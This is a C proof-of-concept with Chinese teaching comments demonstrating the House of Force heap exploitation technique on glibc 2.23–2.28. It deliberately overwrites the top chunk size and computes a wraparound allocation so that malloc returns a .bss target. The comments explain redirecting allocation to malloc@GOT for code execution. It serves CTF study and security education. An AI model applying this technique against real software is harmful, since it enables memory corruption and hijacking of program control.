/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_force
 * 文件标注范围：2.23 ~ 2.28
 * 模拟漏洞：可覆盖 top chunk 的 size。
 * 核心流程：把 top->size 改成极大值，再申请 target-top-headers 的环绕距离，使新 top 落到目标前方。
 * 成功判据：下一次 malloc 返回 target；2.29 的 top size <= system_mem 检查使经典形式失效。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

/*
 * House of Force 本身只用 top 与目标的相对距离，ASLR 开启时只要已有堆泄漏
 * 和目标泄漏仍可工作。旧案例常把返回块导向 GOT，这要求关闭 RELRO；RELRO
 * 开启时可改选栈、.bss 或其他可写目标。把 top 推向栈的经典讨论见：
 * http://phrack.org/issues/66/10.html
 * 上游曾在 64 位 Ubuntu 14.04 与 Ubuntu 18.04 测试该 PoC。
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{

	intptr_t *p1 = malloc(256);

	int real_size = malloc_usable_size(p1);

	//----- 漏洞模拟开始：通过相邻堆溢出覆盖 top header -----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));

	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;

	//------------------------

	/*
	 * 反算 evil_size。令 nb 为 request2size 后包含 header 的内部尺寸，则：
	 *   新 top = 旧 top + nb；
	 *   nb = 目标 chunk header - 旧 top；
	 *   对齐前的申请大小满足：request + 2*sizeof(long) = nb。
	 * 下一次 malloc 返回新 top 再加用户区偏移 2*sizeof(long)，所以要让用户
	 * 指针落在 dest，最终得到：
	 *   因而反推出本次申请参数：request = dest - old_top - 4*sizeof(long)。
	 * 这里以 unsigned long 运算，目标位于旧 top 低地址时会自然发生模 2^64
	 * 环绕；伪造为 -1 的巨大 top size 使该环绕距离仍被分配器接受。
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;

	void *new_ptr = malloc(evil_size);

	void* ctr_chunk = malloc(100);

	strcpy(ctr_chunk, "YEAH!!!");

	assert(ctr_chunk == bss_var);

	/*
	 * 若目标换成 malloc@GOT，计算完全相同：第一次受控大申请把 av->top
	 * 推到 malloc_got_address-header；下一次普通申请从 remainder/top
	 * 路径返回 header 之后的用户区，恰好等于 malloc_got_address。
	 * 本文件改用 bss_var，避免把“RELRO 必须关闭”的特定代码执行终点误写成
	 * House of Force 思想本身的必要条件。
	 */
}
